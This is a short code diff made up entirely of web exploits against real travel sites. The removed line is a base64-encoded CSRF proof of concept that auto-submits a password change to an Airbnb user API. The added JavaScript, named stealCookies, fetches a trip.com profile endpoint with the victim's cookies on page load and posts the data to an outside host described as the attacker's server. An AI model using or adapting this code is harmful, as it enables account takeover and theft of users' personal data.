@@ -1,1 +1,26 @@
-<script>window.location='data:text/html;base64,PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8dGl0bGU+Q1NSRiBQb0M8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogIDxoMz5EYXRhIFVSSSBDU1JGIFBvQzwvaDM+CiAgPGZvcm0gYWN0aW9uPSJodHRwczovL3d3dy5haXJibmIuY29tL2FwaS92Mi91c2Vycy81NDc1MDU0Njk/Y3VycmVuY3k9VVNEJmtleT1kMzA2em95anN5YXJwN2lmaHU2N3JqeG41MnR2MHQyMCZsb2NhbGU9ZW4iIG1ldGhvZD0icHV0Ij4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhc3N3b3JkIiB2YWx1ZT0iU2FmZXJlZmFzMTIzNCIgLz4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZyb21fcmV2aWV3X3lvdXJfYWNjb3VudCIgdmFsdWU9InRydWUiIC8+CiAgPC9mb3JtPgogIDxzY3JpcHQ+ZG9jdW1lbnQuZm9ybXNbMF0uc3VibWl0KCk7PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg==';</script>
+// Client-side JavaScript
+async function stealCookies() {
+    try {
+        // Make request with current page's cookies
+        const response = await fetch('https://www.trip.com/restapi/soa2/18073/json/queryPartnerProfileDetails', {
+            method: 'GET',
+            credentials: 'include', // Critical - sends current site's cookies
+            headers: {
+                'Origin': 'http://localhost'
+            }
+        });
+
+        const data = await response.json();
+
+        // Exfiltrate to attacker's server
+        await fetch('https://cvfh8zrh.c5.rs/steal', {
+            method: 'POST',
+            body: JSON.stringify(data)
+        });
+    } catch (error) {
+        console.error('Exploit failed:', error);
+    }
+}
+
+// Trigger on page load
+stealCookies();
